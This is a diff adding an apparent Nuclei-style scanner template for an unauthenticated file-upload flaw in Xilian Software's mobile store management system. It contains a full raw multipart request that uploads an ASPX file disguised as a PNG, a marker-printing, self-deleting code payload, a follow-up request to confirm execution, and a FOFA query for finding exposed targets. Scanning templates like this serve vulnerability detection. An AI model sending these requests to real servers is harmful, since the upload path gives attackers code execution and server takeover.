@@ -1,0 +1,52 @@
+http:
+    - raw:
+        - |
+          POST /api/UploadDB/StreamToFile HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
+          Accept-Encoding: gzip, deflate
+          Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
+          Accept: */*
+          Connection: close
+
+          ------WebKitFormBoundaryFfJZ4PlAZBixjELj
+          Content-Disposition: form-data; name="organ"
+
+          {{username}}
+          ------WebKitFormBoundaryFfJZ4PlAZBixjELj
+          Content-Disposition: form-data; name="devid"
+
+          {{filename}}
+          ------WebKitFormBoundaryFfJZ4PlAZBixjELj
+          Content-Disposition: form-data; name="files";filename="{{username}}.aspx"
+          Content-Type: image/png
+
+          <%@Page Language="C#"%><%Response.Write("pboyjnnrfipmplsukdeczudsefxmywe");System.IO.File.Delete(Request.PhysicalPath);%>
+          ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
+    - matchers:
+        - part: body
+          type: word
+          words:
+            - pboyjnnrfipmplsukdeczudsefxmywe
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          GET /Files/DB/{{username}}_{{filename}}.aspx HTTP/1.1
+          Host: {{Hostname}}
+id: xilian-StreamToFile-File-upload
+info:
+    author: Superhero
+    description: |-
+        fofa: body="西联软件提供云计算服务"
+        西联软件-移动门店管理系统 StreamToFile 接口存在文件上传漏洞，未经身份攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
+    name: 西联软件-移动门店管理系统 StreamToFile 任意文件上传漏洞
+    reference:
+        - https://mp.weixin.qq.com/s/illxKI6r2Cnz7aYHEUyyMg?token=564303397&lang=zh_CN
+    severity: high
+    tags: []
+variables:
+    filename: '{{to_lower(rand_base(4))}}'
+    username: '{{to_lower(rand_base(6))}}'
